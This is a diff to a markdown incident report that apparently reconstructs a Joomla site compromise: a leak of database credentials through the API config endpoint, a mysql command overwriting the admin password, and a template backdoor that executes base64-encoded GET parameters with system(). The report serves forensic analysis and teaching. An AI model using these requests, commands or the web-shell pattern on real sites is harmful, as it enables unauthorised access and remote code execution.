@@ -62,14 +62,62 @@ They described the attack as a warning and promised more severe actions if the c
 #### 2024-05-12 10:26:19 UTC
 The attacker started a port-scanning session and tried also to access the admin page with default credentials but didn't succeed in doing so.
 
+He then sent a targeted request to **"www.potenzio.com/administrator/manifests/files/joomla.xml"** that describes the complete structure of the joomla extension configuration, from which is possible to gather informations about the DB structure as well.
+
+Knowing this the attacker sent another request to **"www.potenzio.com/api/index.php/v1/config/application?public=true"** that responded with a json file with the complete db configuration including the password
+
+```json
+...
+{
+	"type": "application",
+    "id": "224",
+    "attributes": {
+	    "dbtype": "mysqli",
+	    "id": 224
+	}
+},
+{
+	"type": "application",
+    "id": "224",
+    "attributes": {
+	    "host": "10.0.100.100",
+	    "id": 224
+    }
+},
+{
+    "type": "application",
+    "id": "224",
+    "attributes": {
+	    "user": "joomla",
+	    "id": 224
+    }
+},
+{
+	"type": "application",
+	"id": "224",
+	"attributes": {
+	    "password": "secret4joomla",
+	    "id": 224
+    }
+},
+{
+	"type": "application",
+	"id": "224",
+	"attributes": {
+	    "password": "secret4joomla",
+	    "id": 224
+    }
+},
+...
+```
+
+He then tried to use the password to access the admin page but that didn't work 
+
 ### Sending the email
 #### 2024-05-12  10:27:33 UTC
 The attacker sent an email to a Potenzio employee disguising himself for a society called **harmonic.com**  with some *"exclusive offers"* just for him as we can read in the message body:
 
-```
-Content-Type: text/html; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-
+```html
 <html>
   <head>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
@@ -108,7 +156,7 @@ Password: claudione
 
 Using these credentials the attacker invoked a shell on the server, installed mysql-client and accessed the Joomla database changing the password for the admin account to one of his choice:
 
-```
+```bash
 claudio.volume@client:/$ mysql -u joomla --password=secret4joomla -h 10.0.100.100 joomladb -e "Update pnv1x_users SET password = 'd2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199' WHERE name='admin';"
 ```
 
@@ -119,7 +167,7 @@ claudio.volume@client:/$ mysql -u joomla --password=secret4joomla -h 10.0.100.10
 After that he forged a new template where the value of a parameter called *random*, that could be pretty much anything, can be sent in a GET request to the index.php page.
 If the value of the random parameter is some valid command once decoded from base64 is then executed on the server using the *system* command.
 
-```
+```php
 [ content of the index page ]
 .
 .
@@ -144,7 +192,7 @@ http://www.potenzio.com/?rand=bHMgLWxhCg==
 
 Decoded parameter:
 
-```
+```bash
 > base64 -d parameter.txt
 ls -la
 ```
